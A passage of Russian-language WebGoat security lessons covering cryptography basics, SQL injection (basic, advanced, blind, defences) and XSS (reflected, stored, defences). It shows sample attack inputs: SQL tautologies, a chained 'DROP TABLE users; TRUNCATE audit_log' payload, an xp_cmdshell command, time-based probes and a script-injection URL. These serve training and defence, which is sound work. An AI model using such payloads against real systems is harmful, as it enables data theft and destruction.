В целом, защита конфиденциальности и целостности алгоритма генерации файлов cookie аутентификации имеет первостепенное значение для предотвращения несанкционированного доступа и поддержания целостности механизма аутентификации.

---

### **(A2) Криптографические недостатки (Cryptographic Failures)**  

#### **Основы криптографии**

##### **Концепция**

Этот урок объясняет различные типы криптографических методов, обычно используемых в веб-приложениях.

**Цели**

Цель — ознакомиться со следующими формами методов:

*   Кодирование (Encoding)
*   Хеширование (Hashing)
*   Шифрование (Encryption)
*   Подписание (Signing)
*   Хранилища ключей (Keystores)
*   Настройки безопасности по умолчанию (Security defaults)
*   Постквантовая криптография (Post quantum crypto)

**Задания**

После объяснения каждого пункта будет несколько заданий.

---

##### **Симметричное и асимметричное шифрование**

**Симметричное шифрование**
Симметричное шифрование основано на общем секрете, который используется как для шифрования, так и для дешифрования. Следовательно, обе стороны (участвующие в обмене секретами) используют один и тот же ключ.

Примеры протоколов:
*   AES
*   3DES

**Асимметричное шифрование**
Асимметричное шифрование основано на математических принципах и состоит из пары ключей. Два ключа обычно называются закрытым (private) ключом и открытым (public) ключом. Закрытый ключ необходимо очень хорошо защищать, и он известен только одной стороне. Все остальные могут свободно использовать открытый ключ. То, что зашифровано закрытым ключом, может быть расшифровано всеми, у кого есть открытый ключ, а то, что зашифровано открытым ключом, может быть расшифровано только закрытым ключом.

Примеры протоколов:
*   RSA
*   DSA

**HTTPS использует как симметричные, так и асимметричные ключи**
Вот краткое описание того, что происходит, когда вы открываете браузер и переходите на сайт по HTTPS.

1.  Ваш браузер подключается к серверу и получает сертификат веб-сервера.
2.  Ваш браузер проверяет, доверяет ли он издателю сертификата, проверяя, находится ли сертификат издателя в его хранилище доверия (trust store). Это хранилище управляется обновлениями операционной системы и браузера. А в некоторых корпоративных сетях им управляет компания. Из сертификата браузер получает открытый ключ.
3.  Браузер генерирует случайные байты для создания симметричного ключа и шифрует их открытым ключом сервера. Таким образом, только сервер может их расшифровать.
4.  В конце этого процесса и браузер, и веб-сервер будут использовать обмененный симметричный ключ (в процессе асимметричного обмена ключами) для шифрования и дешифрования сообщений, отправляемых между браузером и веб-сервером.

Симметричные ключи используются потому, что их легче применять с большими объемами данных, и для этого требуется меньше вычислительной мощности. Однако информация на этих страницах предназначена только для базового понимания криптографии. Найдите в Интернете более подробную информацию по этим темам.

---

##### **Хранилища ключей (Keystores)**

Хранилище ключей (keystore) — это место, где вы храните ключи. Помимо **keystore**, часто используется термин **truststore** (хранилище доверия). Truststore — это то же самое, что и keystore. Только обычно он содержит только сертификаты (то есть, по сути, только открытые ключи и информацию об издателе) доверенных сертификатов или центров сертификации.

**Файловые хранилища ключей**
Файловое хранилище ключей — это такое, где ключи в конечном итоге хранятся в файловой системе. Хранение открытых сертификатов в файловом хранилище ключей очень распространено.

**Хранилища ключей в базе данных**
Ключи и, особенно, открытые сертификаты, конечно, также могут храниться в базе данных.

**Аппаратные хранилища ключей**
Аппаратное хранилище ключей — это система, в которой есть некое аппаратное обеспечение, содержащее фактические ключи. Обычно это делается в средах с высоким уровнем безопасности, где закрытый ключ действительно является конфиденциальным. По сравнению с файловыми хранилищами или хранилищами в базе данных, невозможно сделать копию хранилища ключей, чтобы отправить ее в какую-либо неизвестную и ненадежную среду.

Некоторые центры сертификации, которые используются для предоставления серверного сертификата для вашего веб-сайта, также создают для вас закрытые ключи (как услуга). Однако, по определению, это больше не считается закрытым ключом. Для всех типов хранилищ ключей вы должны сохранять закрытый ключ в секрете и использовать запрос на подписание сертификата (CSR) для заказа сертификатов.

**Управляемые хранилища ключей в ОС, браузерах и других приложениях**
Когда вы посещаете веб-сайт, и ваш браузер сообщает, что сертификаты в порядке, это означает, что сертификат, используемый для веб-сайта, выдан доверенным центром сертификации. Но этот список доверенных центров сертификации управляется. Некоторые ЦС могут быть отозваны или удалены. Эти обновления происходят в фоновом режиме при установке обновлений браузера. Не только браузер поддерживает список доверенных центров сертификации, операционная система также делает это. И среда выполнения Java также имеет свой собственный список, который хранится в файле `cacerts`. Обновления ОС и JRE поддерживают этот список в актуальном состоянии. В корпоративных средах ими обычно управляет компания, и они также содержат корневые сертификаты компании.

**Дополнительная проверка сертификатов веб-сайтов с использованием DNS CAA записей**
Некоторые компании проверяют весь или большую часть интернет-трафика. Даже тот, где вы думаете, что у вас защищенное соединение от конца к концу. Это работает следующим образом. Сотрудник открывает браузер и ищет какую-либо информацию в Google. Браузер использует HTTPS и переходит на сайт Google. Ссылка выглядит настоящей, и в браузере отображается значок замка. Однако, если вы проверите сертификат, вы можете заметить, что он был выдан одним из корневых ЦС вашей компании! Таким образом, вы установили защищенное соединение от конца к концу с сервером вашей компании, и этот сервер имеет защищенное соединение с Google. Чтобы предотвратить такие атаки "человек посередине" на ваш сервер, современные браузеры теперь также проверяют DNS CAA записи, чтобы определить, разрешен ли определенный издатель для конкретного веб-сайта. Подробнее: Википедия: DNS CAA.

**Бесплатные сертификаты от Let's Encrypt**
Let's Encrypt — это бесплатный, автоматизированный и открытый Центр сертификации. Он позволяет создавать действительные сертификаты для веб-сайтов, которыми вы управляете. Следуя и реализуя определенный протокол, ваша личность проверяется, и сертификат выдается. Сертификаты предоставляются бесплатно, и это делается для стимулирования использования авторизованных сертификатов и сокращения использования самоподписанных сертификатов в Интернете. Сертификаты действительны в течение 90 дней, поэтому их необходимо автоматически обновлять. (Это гарантирует, что подтверждение личности/владения также происходит часто).

---

##### **Постквантовая криптография**

Квантовые компьютеры уже здесь и с каждым годом становятся мощнее в доступных кубитах. Квантовые компьютеры способны и будут способны расшифровывать информацию, которая была зашифрована с помощью алгоритмов, считавшихся безопасными. Уже несколько лет записывается множество зашифрованной связи, использующей криптографию, уязвимую для квантовых атак. Эта информация будет расшифрована, когда квантовые компьютеры станут достаточно мощными. Даже если информация устареет, она все равно может содержать ценную информацию, которой можно злоупотребить. Помимо того, что некоторая конфиденциальная информация станет известна сторонам, для которых она не предназначалась.

Математика дает ответы для постквантовой эры. Новая криптография уже доступна и должна использоваться СЕЙЧАС, чтобы минимизировать угрозы. Вы можете прочитать об этом больше в Википедии:
Постквантовая криптография в Википедии

---

### **(A3) Внедрение (Injection)**  

#### **Внедрение SQL (введение)**
##### **Концепция**

Этот урок описывает, что такое язык структурированных запросов (SQL) и как им можно манипулировать для выполнения задач, не входивших в первоначальный замысел разработчика.

**Цели**

*   Пользователь получит базовое понимание того, как работает SQL и для чего он используется.
*   Пользователь получит базовое понимание того, что такое SQL-инъекция и как она работает.
*   Пользователь продемонстрирует знания о:
    *   DML, DDL и DCL
    *   Строковых SQL-инъекциях
    *   Числовых SQL-инъекциях
    *   Том, как SQL-инъекция нарушает триаду CIA.

---

##### **Что такое SQL-инъекция?**

SQL-инъекция (также называемая SQLi) — это одна из самых распространенных техник взлома веб-сайтов. Атака с использованием SQL-инъекции заключается во внедрении или "инъекции" вредоносного кода через ввод SQL-запроса от клиента в приложение. Если с этим не бороться правильно, SQL-инъекция может серьезно повлиять на целостность и безопасность данных.

SQL-инъекции могут происходить, когда нефильтрованные данные от клиента, например, ввод из поля поиска, попадают в SQL-интерпретатор самого приложения. Если приложение не обеспечивает правильную санитацию (экранирование) пользовательского ввода (с использованием подготовленных выражений или аналогичных методов) или не фильтрует ввод на наличие специальных символов, хакеры могут манипулировать базовым SQL-запросом в своих интересах.
Например, если ввод не фильтруется на наличие SQL-метасимволов, таких как `--` (что комментирует остаток строки) или `;` (что завершает SQL-запрос), может произойти SQL-инъекция.

**Пример SQL-инъекции**

Например, рассмотрим веб-приложение, которое позволяет пользователям получать информацию о пользователе, просто вводя имя пользователя в поле формы. Ввод от пользователя отправляется на сервер и вставляется в SQL-запрос, который затем обрабатывается SQL-интерпретатором.

SQL-запрос для получения информации о пользователе из базы данных выглядит так:
`"SELECT * FROM users WHERE name = '" + userName + "';"`

Переменная **userName** содержит ввод от клиента и "внедряет" его в запрос.
Если ввод будет `Smith`, запрос станет:
`"SELECT * FROM users WHERE name = 'Smith';"`
и получит все данные для пользователя с именем Smith.

Если злоумышленник введет данные, содержащие символы или строки, имеющие "особое" значение для SQL-интерпретатора (такие как: `--`, или `'`), и данные не будут правильно обработаны или проверены, злоумышленник может изменить предполагаемое поведение SQL-запроса, чтобы выполнить другие (вредоносные) действия с базой данных.

Вот поле ввода. Попробуйте ввести какой-нибудь SQL-код, чтобы лучше понять, как меняется запрос.

**Имя пользователя:** [ Поле для ввода ]

`"SELECT * FROM users WHERE name = ''";`

**Примеры**

SQL-инъекция может использоваться для гораздо большего, чем просто чтение данных одного пользователя. Ниже приведены всего несколько примеров данных, которые хакер мог бы ввести в поле формы (или anywhere, где принимается пользовательский ввод) в попытке использовать уязвимость SQL-инъекции:

*   **`Smith' OR '1' = '1`**
    приводит к `SELECT * FROM users WHERE name = 'Smith' OR TRUE;`, что вернет все записи из таблицы `users`.
*   **`Smith' OR 1 = 1; --`**
    приводит к `SELECT * FROM users WHERE name = 'Smith' OR TRUE;--';`, что, как и в первом примере, также вернет все записи из таблицы `users`.
*   **`Smith'; DROP TABLE users; TRUNCATE audit_log;`**
    объединяет несколько SQL-команд, чтобы одновременно УДАЛИТЬ (DROP) таблицу `users` и удалить все записи из таблицы `audit_log`.

---

##### **Последствия SQL-инъекции**

**Успешная эксплуатация SQL-инъекции может:**

*   Читать и изменять конфиденциальные данные из базы данных.
*   Выполнять административные операции с базой данных:
    *   Отключать аудит или СУБД.
    *   Очищать таблицы и логи.
    *   Добавлять пользователей.
*   Восстанавливать содержимое заданного файла, присутствующего в файловой системе СУБД.
*   Выдавать команды операционной системе.

**Атаки с использованием SQL-инъекции позволяют злоумышленникам:**

*   Подделывать личность.
*   Фальсифицировать существующие данные.
*   Вызывать проблемы с неотказуемостью, такие как аннулирование транзакций или изменение балансов.
*   Обеспечить полное раскрытие всех данных в системе.
*   Уничтожить данные или сделать их иным образом недоступными.
*   Стать администратором сервера базы данных.

---

##### **Серьезность SQL-инъекции**

Серьезность атак с использованием SQL-инъекции ограничивается:
*   Навыками и воображением злоумышленника.
*   Мерами противодействия "глубокой эшелонированной защиты" (Defense in depth):
    *   Проверка ввода.
    *   Принцип наименьших привилегий.
*   Технологией базы данных.

**Не все базы данных поддерживают объединение команд (chaining)**
*   Microsoft Access
*   MySQL Connector/J и C
*   Oracle

**SQL-инъекции более распространены в PHP, Classic ASP, Cold Fusion и старых языках**
*   Языки, которые не предоставляют поддержку параметризованных запросов.
*   Параметризованные запросы были добавлены в новые версии.
*   Ранние последователи веб-технологий (т.е. Старый Код).

**Не все базы данных одинаковы (SQL Server)**
*   Командная оболочка: `master.dbo.xp_cmdshell 'cmd.exe dir c:'`
*   Команды реестра: `xp_regread`, `xp_regdeletekey`, ...

---

#### **Внедрение SQL (продвинутый уровень)**

##### **Концепция**

Этот урок описывает более продвинутые темы, связанные с SQL-инъекциями.

**Цели**

*   Комбинирование техник SQL-инъекций
*   Слепые SQL-инъекции (Blind SQL injection)

---

##### **Специальные символы и операторы**

**Специальные символы**

`/* */` — строчные комментарии
`--`, `#` — комментарии до конца строки

*Пример:* `SELECT * FROM users WHERE name = 'admin' -- AND pass = 'pass'`

`;` — позволяет объединять запросы (chaining)

*Пример:* `SELECT * FROM users; DROP TABLE users;`

`+`, `||`, `,` — позволяют конкатенацию строк
`Char()` — строки без кавычек

*Пример:* `SELECT * FROM users WHERE name = ' + char(27) OR 1=1`

**Специальные операторы**

**Union**
Оператор Union используется для объединения результатов двух или более операторов SELECT.

Правила, которые следует помнить при работе с UNION:
*   Количество выбранных столбцов в каждом операторе должно быть одинаковым.
*   Тип данных первого столбца в первом операторе SELECT должен совпадать с типом данных первого столбца во втором (третьем, четвертом, ...) операторе SELECT. То же самое относится и ко всем остальным столбцам.

`SELECT first_name FROM user_system_data UNION SELECT login_count FROM user_data;`

Синтаксис `UNION ALL` также позволяет использовать дублирующиеся значения.

**Joins (Соединения)**
Оператор Join используется для объединения строк из двух или более таблиц на основе связанного столбца.

`SELECT * FROM user_data INNER JOIN user_data_tan ON user_data.userid=user_data_tan.userid;`

Для получения более подробной информации о JOIN посетите: https://www.w3schools.com/sql/sql_join.asp

---

##### **Слепая SQL-инъекция**

Слепая SQL-инъекция — это тип атаки SQL-инъекции, который задает базе данных вопросы "истина" или "ложь" и определяет ответ на основе реакции приложения. Эта атака часто используется, когда веб-приложение настроено на показ общих сообщений об ошибках, но не устранило код, уязвимый для SQL-инъекций.

**Различие**
Давайте начнем с различия между обычной SQL-инъекцией и слепой SQL-инъекцией. При обычной SQL-инъекции сообщения об ошибках от базы данных отображаются и дают достаточно информации, чтобы понять, как работает запрос. Или в случае SQL-инъекции на основе UNION приложение не отражает информацию напрямую на веб-странице. Итак, в случае, когда ничего не отображается, вам нужно начать задавать базе данных вопросы на основе утверждений "истина" или "ложь". Вот почему слепую SQL-инъекцию эксплуатировать гораздо сложнее.

Существует несколько различных типов слепых SQL-инъекций: основанные на содержании (content-based) и основанные на времени (time-based).

**Пример**
В этом случае мы пытаемся задать базе данных булев вопрос на основе уникального идентификатора. Например, предположим, у нас есть следующий URL: `https://my-shop.com/articles/4`
На стороне сервера этот запрос будет преобразован следующим образом:
`SELECT * FROM articles WHERE article_id = 4`

Когда мы хотим это эксплуатировать, мы меняем URL на: `https://shop.example.com/articles/4 AND 1=1`
Это будет преобразовано в:
`SELECT * FROM articles WHERE article_id = 4 and 1 = 1`

Если браузер вернет ту же страницу, что и при использовании `https://shop.example.com/articles/4`, вы знаете, что веб-сайт уязвим для слепой SQL-инъекции. Если браузер отвечает страницей "не найдено" или чем-то еще, вы знаете, что слепая SQL-инъекция может не сработать. Теперь вы можете изменить SQL-запрос и протестировать, например: `https://shop.example.com/articles/4 AND 1=2`, который ничего не вернет, потому что запрос возвращает ложь.

Как мы фактически используем это? Выше мы задали базе данных тривиальный вопрос, но вы можете, например, также использовать следующий URL:
`https://shop.example.com/articles/4 AND substring(database_version(),1,1) = 2`

Большую часть времени вы начинаете с определения типа используемой базы данных. На основе типа базы данных вы можете найти системные таблицы, перечислить все таблицы, присутствующие в базе данных. С этой информацией вы можете начать получать информацию из всех таблиц и сможете дампнуть базу данных. Имейте в виду, что этот подход может не сработать, если привилегии базы данных настроены правильно (то есть системные таблицы не могут быть запрошены с пользователем, используемым для подключения от веб-приложения к базе данных).

Другой способ называется SQL-инъекцией, основанной на времени (time-based). В этом случае вы попросите базу данных подождать, прежде чем вернуть результат. Это может понадобиться, если вы полностью "слепы". Это означает, что нет разницы между данными ответа. Для достижения такого рода SQL-инъекции вы можете использовать:
`article = 4; sleep(10) --`

---

#### **Внедрение SQL (защита)**

##### **Неизменяемые запросы**

Это лучшая защита от SQL-инъекций. Они либо не содержат данных, которые могут быть интерпретированы, либо обрабатывают данные как единую сущность, которая привязывается к столбцу без интерпретации.

*   **Статические запросы**
    *   `String query = "SELECT * FROM products";`
    *   `String query = "SELECT * FROM users WHERE user = '" + session.getAttribute("UserID") + "'";`
*   **Параметризованные запросы**
    *   `String query = "SELECT * FROM users WHERE last_name = ?";`
    *   `PrepareStatement statement = connection.prepareStatement(query);`
    *   `statement.setString(1, accountName);`
    *   `ResultSet results = statement.executeQuery();`
*   **Хранимые процедуры**
    *   Только если хранимая процедура не генерирует динамический SQL.

---

##### **Хранимые процедуры**

*   **Безопасная хранимая процедура (Microsoft SQL Server)**
    ```sql
    CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
    AS
    SELECT city, COUNT(*)
    FROM customers
    WHERE country LIKE @Country GROUP BY city

    EXEC ListCustomers 'USA'
    ```
*   **Уязвимая хранимая процедура (Microsoft SQL Server)**
    ```sql
    CREATE PROCEDURE getUser(@lastName nvarchar(25))
    AS
    declare @sql nvarchar(255)
    set @sql = 'SELECT * FROM users WHERE lastname = ''' + @LastName + ''''
    exec sp_executesql @sql
    ```

---

##### **Параметризованные запросы - Фрагмент кода на Java**

```java
public static bool isUsernameValid(string username) {
    RegEx r = new Regex("^[A-Za-z0-9]{16}$");
    return r.isMatch(username);
}

// java.sql.Connection conn is set elsewhere for brevity.
PreparedStatement ps = null;
ResultSet rs = null;
try {
    String pUsername = request.getParameter("UserName");
    if (isUsernameValid(pUsername)) {
        ps = conn.prepareStatement("SELECT * FROM user_table WHERE username = ?");
        ps.setString(1, pUsername);
        rs = ps.executeQuery();
        if (rs.next()) {
            // do the work of making the user record active in some way
        }
    } else {
        // handle invalid input
    }
} catch (...) { // handle all exceptions ... }
```

**Важно**
Используйте подготовленное выражение правильно: параметры должны устанавливаться с помощью `ps.set...()`. НЕ используйте следующий подход:

```java
// НЕПРАВИЛЬНО!
String insertStatement = "INSERT INTO USERS (id, name, email) VALUES (%s, %s, %s)".format("1", "webgoat", "webgoat@owasp.org");
PreparedStatement statement = conn.prepareStatement(insertStatement);
statement.executeUpdate();
```

Правильный способ использования подготовленного выражения:

```java
// ПРАВИЛЬНО
PreparedStatement statement = conn.prepareStatement("INSERT INTO USERS (id, name, email) VALUES (?, ?, ?)");
statement.setString(1, "1");
statement.setString(2, "webgoat");
statement.setString(3, "webgoat@owasp.org");
statement.executeUpdate();
```

---

##### **Параметризованные запросы - Пример на Java**

```java
public static String loadAccount() {
    // Parser returns only valid string data
    String accountID = getParser().getStringParameter(ACCT_ID, "");
    String data = null;
    String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
    try (Connection connection = dataSource.getConnection();
         PreparedStatement statement = connection.prepareStatement(query)) {
        statement.setString(1, accountID);
        ResultSet results = statement.executeQuery();
        if (results != null && results.first()) {
            results.last(); // Only one record should be returned for this query
            if (results.getRow() <= 2) {
                data = processAccount(results);
            } else {
                // Handle the error - Database integrity issue
            }
        } else {
            // Handle the error - no records found
        }
    } catch (SQLException sqle) {
        // Log and handle the SQL Exception
    }
    return data;
}
```

---

##### **Параметризованные запросы - .NET**

```csharp
public static bool isUsernameValid(string username) {
    RegEx r = new Regex("^[A-Za-z0-9]{16}$");
    return r.isMatch(username);
}

// SqlConnection conn is set and opened elsewhere for brevity.
try {
    string selectString = "SELECT * FROM user_table WHERE username = @userID";
    SqlCommand cmd = new SqlCommand(selectString, conn);
    if (isUsernameValid(uid)) {
        cmd.Parameters.Add("@userID", SqlDbType.VarChar, 16).Value = uid;
        SqlDataReader myReader = cmd.ExecuteReader();
        if (myReader) {
            // make the user record active in some way.
            myReader.Close();
        }
    } else { // handle invalid input }
}
catch (Exception e) { // Handle all exceptions... }
```

---

##### **Требуется ли проверка ввода?**

*Вопрос:* Разве мои запросы больше не подвержены инъекциям, нужно ли мне все еще проверять ввод?
*Ответ:* **ДА!**

*   **Предотвращает хранение в базе данных других типов атак**
    *   Хранимый XSS
    *   Утечка информации
    *   Логические ошибки - проверка бизнес-правил
    *   SQL-инъекции
*   **Часто база данных считается доверенной**

---

##### **Предложение ORDER BY**

*Вопрос:* Всегда ли подготовленное выражение предотвращает SQL-инъекцию?
*Ответ:* **Нет, не всегда.**

Рассмотрим следующее выражение:
`"SELECT * FROM users ORDER BY " + sortColumnName + ";`

Согласно грамматике SQL, `orderExpression` может быть `selectExpression`, который, в свою очередь, может быть функцией. Например, с помощью оператора CASE мы можем задавать базе данных вопросы:

`SELECT * FROM users ORDER BY (CASE WHEN (TRUE) THEN lastname ELSE firstname END)`

Таким образом, мы можем подставить любую булеву операцию в часть `WHEN(...)`. Запрос будет работать, потому что он является допустимым, независимо от того, используете ли вы подготовленное выражение или нет. По определению, предложение `ORDER BY` может содержать выражение.

**Способы устранения**
Если вам нужно предоставить столбец для сортировки в вашем веб-приложении, вы должны реализовать **белый список** для проверки значения в предложении `ORDER BY`. Он всегда должен быть ограничен чем-то вроде 'first_name' или 'last_name'.

---

##### **Наименьшие привилегии**

*   **Подключайтесь с минимальным набором привилегий**
    *   Приложение должно подключаться к базе данных с разными учетными данными для каждого уровня доверия.
    *   Приложениям редко требуются права на удаление для таблицы или базы данных.
*   **Учетные записи базы данных должны ограничивать доступ к схеме.**
*   **Определите учетные записи базы данных для доступа на чтение и чтение/запись.**
*   **Несколько пулов соединений на основе уровня доступа**
    *   Используйте доступ только для чтения для запроса аутентификации.
    *   Используйте доступ на чтение/запись для запросов на изменение данных.
    *   Используйте право на выполнение для доступа к вызовам хранимых процедур.

---

#### **Межсайтовый скриптинг (XSS)**

##### **Концепция**

Этот урок описывает, что такое Межсайтовый скриптинг (XSS), и как его можно использовать для выполнения задач, не предусмотренных изначально разработчиком.

**Цели**

*   Пользователь должен получить базовое понимание того, что такое XSS и как это работает.
*   Пользователь узнает, что такое Отраженный XSS.
*   Пользователь продемонстрирует знания о:
    *   Внедрении Отраженного XSS.
    *   Внедрении DOM-based XSS.

---

##### **Наиболее распространенные места уязвимостей**

*   Поля поиска, которые возвращают пользователю введенную поисковую строку.
*   Поля ввода, которые отображают пользовательские данные.
*   Сообщения об ошибках, которые возвращают текст, предоставленный пользователем.
*   Скрытые поля, содержащие пользовательские данные.
*   Любая страница, которая отображает пользовательские данные.
    *   Форумы.
    *   Свободные комментарии.
*   HTTP-Заголовки.

---

##### **Почему это должно нас волновать?**

**Атаки XSS могут привести к:**

*   Краже сессионных куки.
*   Созданию ложных запросов.
*   Созданию ложных полей на странице для сбора учетных данных.
*   Перенаправлению вашей страницы на "недружественный" сайт.
*   Созданию запросов, которые маскируются под действительного пользователя.
*   Краже конфиденциальной информации.
*   Выполнению вредоносного кода на системе конечного пользователя (активные сценарии).
*   Размещению враждебного и неприемлемого контента.

> `<img src="http://malicious.site.com/image.jpg/>`
> "GoodYear рекомендует покупать шины Bridgestone..."

**Атаки XSS придают достоверность фишинговым атакам**

*   В URL используется действительный домен.

---

##### **Типы XSS**

**Отраженный (Reflected)**
*   Вредоносный контент из пользовательского запроса отображается пользователю в веб-браузере.
*   Вредоносный контент записывается на страницу после ответа сервера.
*   Требуется социальная инженерия.
*   Выполняется с привилегиями браузера, унаследованными от пользователя.

**На основе DOM (DOM-based) (также технически отраженный)**
*   Клиентские скрипты используют вредоносный контент из пользовательского запроса для записи HTML на свою страницу.
*   Похож на отраженный XSS.
*   Выполняется с привилегиями браузера, унаследованными от пользователя.

**Постоянный (Stored or persistent)**
*   Вредоносный контент хранится на сервере (в базе данных, файловой системе или других объектах) и впоследствии отображается пользователям в веб-браузере.
*   Социальная инженерия не требуется.

---

##### **Сценарий Отраженного XSS**

*   Злоумышленник отправляет жертве вредоносный URL.
*   Жертва переходит по ссылке, которая загружает вредоносную веб-страницу.
*   Вредоносный скрипт, встроенный в URL, выполняется в браузере жертвы.
    *   Скрипт крадет конфиденциальную информацию, например, идентификатор сессии, и передает ее злоумышленнику.

**Жертва не осознает, что произошла атака.**

---

##### **Self-XSS или Отраженный XSS?

Вы должны были иметь возможность выполнить скрипт в последнем примере. Однако на данный момент это считается «Self-XSS».

Почему?

Потому что нет ссылки, которая запускает этот XSS. Вы можете попробовать сами, чтобы увидеть, что произойдет... перейдите по адресу:

`CrossSiteScripting/attack5a?QTY1=1&QTY2=1&QTY3=1&QTY4=1&field1=<script>alert('my%20javascript%20here')</script>4128+3214+0002+1999&field2=111`

---

##### **Отраженный и DOM-Based XSS**

DOM-based XSS — это другая форма отраженного XSS. Оба типа запускаются путем отправки ссылки с входными данными, отраженными в браузере. Разница между DOM и «традиционным» отраженным XSS заключается в том, что в случае с DOM полезная нагрузка никогда не попадает на сервер. Её обработает только клиент.

*   Злоумышленник отправляет жертве вредоносный URL.
*   Жертва нажимает на ссылку.
*   Эта ссылка может загрузить вредоносную веб-страницу или веб-страницу, которой жертва пользуется (и в которую авторизована?), имеющую уязвимый маршрут/обработчик.
*   Если это вредоносная веб-страница, она может использовать собственный JavaScript для атаки на другую страницу/URL с уязвимым маршрутом/обработчиком.
*   Уязвимая страница отображает полезную нагрузку и выполняет атаку в контексте пользователя на этой странице/сайте.
*   Вредоносный скрипт злоумышленника может выполнять команды с привилегиями локальной учетной записи.

**Жертва не осознает, что произошла атака** ... Злоумышленники не используют `<script>alert('xss')</script>`.

---

#### **Межсайтовый скриптинг (хранимый)**

##### **Концепция**

Познакомившись с Отраженным XSS в предыдущем уроке, мы теперь подробнее рассмотрим другую форму атаки межсайтового скриптинга: Постоянный XSS (Stored XSS).

**Цели**

*   Пользователь узнает, что такое Постоянный XSS.
*   Пользователь продемонстрирует знания о:
    *   Внедрении Постоянного XSS.

---

##### **Постоянный XSS (Stored XSS)**

Постоянный межсайтовый скриптинг отличается тем, что вредоносная нагрузка сохраняется (хранится) на сервере, а не передается/внедряется через ссылку.

**Сценарий Постоянного XSS**

*   Злоумышленник размещает вредоносный скрипт на форуме (доске сообщений).
*   Сообщение сохраняется в базе данных сервера.
*   Жертва читает это сообщение.
*   Вредоносный скрипт, встроенный в сообщение на форуме, выполняется в браузере жертвы.
    *   Скрипт крадет конфиденциальную информацию, например, идентификатор сессии, и передает ее злоумышленнику.

**Жертва не осознает, что произошла атака.**

---

#### **Межсайтовый скриптинг (защита)**

##### **Концепция**

После изучения того, что такое межсайтовый скриптинг (XSS) и как он работает, вы узнаете, как можно защититься от него.

**Цели

- Пользователь поймет лучшие практики защиты от XSS-атак с инъекциями.
- Пользователь продемонстрирует знание:
  - Меры противодействия XSS

---

##### Защита от XSS

**Зачем?**

Надеемся, мы это уже объяснили. Суть в том, что вы не хотите, чтобы чужой код выполнялся в контексте ваших пользователей и их сессии.

**Что кодировать?**

Основной принцип защиты от XSS — это **кодирование выходных данных** любого ненадежного ввода перед выводом на экран. Это может меняться с появлением более сложных атак, но это все еще лучшая защита, которая у нас есть сейчас. **И... контекст важен**.

Еще одно замечание о «ненадежном вводе». Если есть сомнения, рассматривайте все (даже данные, которые вы сохранили в своей БД, как ненадежные). Иногда данные передаются между несколькими системами, и то, что вы считаете своими данными, могло быть создано не вами/вашей командой.

**Когда/Где?**

Кодируйте данные в момент их отправки в браузер (а не при сохранении данных). В случае **одностраничных приложений (SPA)** вам нужно будет кодировать на стороне клиента. Для деталей обратитесь к документации вашего фреймворка/библиотеки, но некоторые ресурсы будут предоставлены на следующей странице.

**Как?**

- Кодируйте как HTML-сущности в теле HTML.
- Кодируйте как HTML-сущности в атрибутах HTML.
- Кодируйте для JavaScript, если выводите пользовательский ввод в код JavaScript (но подумайте об этом... вы выводите пользовательский ввод в JavaScript на вашей странице!).

**НЕ пытайтесь** использовать черный список/негативную фильтрацию строк вроде `<script>` и так далее.

...Смотрите следующую страницу для рекомендуемых ресурсов и материалов по защите от XSS.

---

##### **Что такое кодирование?**

Не доверять пользовательскому вводу означает проверять данные на тип, длину, формат и диапазон всякий раз, когда они пересекают границу доверия, например, передаются из веб-формы в скрипт приложения, а затем кодировать их перед повторным отображением в динамической странице.

На практике это означает, что вам нужно просмотреть каждую точку вашего сайта, где обрабатываются и используются данные, предоставленные пользователем, и убедиться, что перед возвратом пользователю любые значения, принятые со стороны клиента, проверяются, фильтруются и кодируются.

На клиентскую валидацию полагаться нельзя, но пользовательский ввод можно привести к минимальному алфавитно-цифровому набору с помощью серверной обработки, прежде чем использовать его в веб-приложении каким-либо образом.

**Экранирование**

Экранирование означает, что вы преобразуете (или помечаете) ключевые символы данных, чтобы предотвратить их интерпретацию в опасном контексте. В случае вывода HTML вам нужно преобразовать символы < и > (среди прочих), чтобы предотвратить отображение любого вредоносного кода. Экранирование этих символов предполагает их преобразование в эквиваленты сущностей: `&lt;` и `&gt;`, которые браузер не будет интерпретировать как HTML-теги.

**Специальные символы**

Вам нужно кодировать специальные символы, такие как "<" и ">", перед их повторным отображением, если они получены из пользовательского ввода. Например, кодирование "<" и ">" гарантирует, что браузер отобразит `<script>`, но не выполнит его. Вместе с кодированием ваши веб-страницы всегда должны определять свою кодировку символов, чтобы браузер не интерпретировал коды специальных символов из других наборов символов.

Межсайтовые скриптинговые атаки обычно происходят, когда вам удается проникнуть скриптом (обычно javascript) на чужой веб-сайт, где он может выполняться злонамеренно.

**Соответствующие специальные символы XML/HTML**

| Символ | Escape-строка |
| :----: | :------------ |
| <      | `&lt;`        |
| >      | `&gt;`        |
| "      | `&quot;`      |
| '      | `&#x27;`      |
| &      | `&amp;`       |
| /      | `&#x2F;`      |

---

##### **Ресурсы по защите от XSS**

**Java OWASP Encoder**
Не смущайтесь статусом "incubator" у этого проекта. Используйте его, если вы разрабатываете веб-приложения на Java и защищаетесь от XSS. Используйте эту ссылку: https://www.owasp.org/index.php/OWASP_Java_Encoder_Project

**Общая шпаргалка по предотвращению XSS**
Ссылка: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

**Шпаргалка по предотвращению DOM-based XSS**
Ссылка: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

**Обход XSS-фильтров**
Полезно знать своего врага... Ссылка: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

**Особенности JavaScript-фреймворков**
Кодирование на клиенте может быть сложным. Вот некоторые ресурсы, которые помогут с этим. Если вы не видите свой фреймворк ниже (например, Ember, React, ???) и хотели бы внести вклад или предложить что-то, зайдите на https://github.com/WebGoat/WebGoat и создайте issue (желательно с некоторыми рекомендациями/ссылками) или сделайте форк и отправьте pull request.

**jQuery**
имейте в виду, если вы используете что-то вроде:

*`$selector.html(userinput/here)`*,

вы в опасности. Если вы хотите использовать это, убедитесь, что вы делаете что-то более похожее на:

*`$selector.html(someEncodeHtmlMethod(userinput/Here))`*

ИЛИ

*`$selector.text(someEncodeHtmlMethod(userinput/Here))`*

Если вам нужен только текст того, что выводится пользователем
*(http://stackoverflow.com/questions/9735045/is-jquery-text-method-xss-sale/9735119)*

**Backbone.js**
(Один символ может иметь такое значение)

